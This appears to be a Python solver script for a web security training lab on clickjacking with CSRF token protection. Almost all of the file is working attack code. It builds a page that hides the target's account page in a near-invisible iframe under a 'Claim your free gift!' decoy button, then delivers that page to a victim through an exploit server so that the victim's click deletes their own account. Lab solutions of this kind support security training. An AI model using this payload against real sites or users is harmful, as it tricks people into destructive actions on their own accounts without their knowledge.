import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Basic clickjacking with CSRF token protection"


def post_data(url, data, cookies=None, allow_redirects=True):
    try:
        return requests.post(url, data=data, cookies=cookies, allow_redirects=allow_redirects, verify=False)
    except Exception as e:
        print(f"[!] Failed to post data: {e}")
        return None


def run(url, payload=None, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        exploit_server = input(
            "[?] Enter the exploit server URL: ").strip().rstrip('/')

        # Frame and decoy positioning
        frame_width = 700
        frame_height = 700
        decoy_button_top = 500
        decoy_button_left = 100

        # Clickjacking payload
        payload = f"""<html>
<head>
    <style>
        #frame {{
            position: relative;
            width: 700px;
            height: 700px;
            opacity: 0.0001;
            z-index: 2;
        }}
        #decoy_button {{
            position: absolute;
            top: 520px;
            left: 100px;
            z-index: 3;
            background-color: red;
            color: white;
            font-size: 20px;
            padding: 10px;
            border: none;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <button id="decoy_button">Claim your free gift!</button>
    <iframe id="frame" src="{url.rstrip('/')}/my-account"></iframe>
</body>
</html>"""

        exploit_data = {
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": payload,
            "formAction": "DELIVER_TO_VICTIM",
            "urlIsHttps": "on",
            "responseFile": "/exploit"
        }

        res = post_data(exploit_server + "/", exploit_data)

        if res and res.status_code == 200:
            print("[+] Exploit delivered successfully!")
            print("[*] Victim's account should be deleted upon click.")
            return True
        else:
            print("[-] Exploit delivery failed.")
            return False

    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        return False
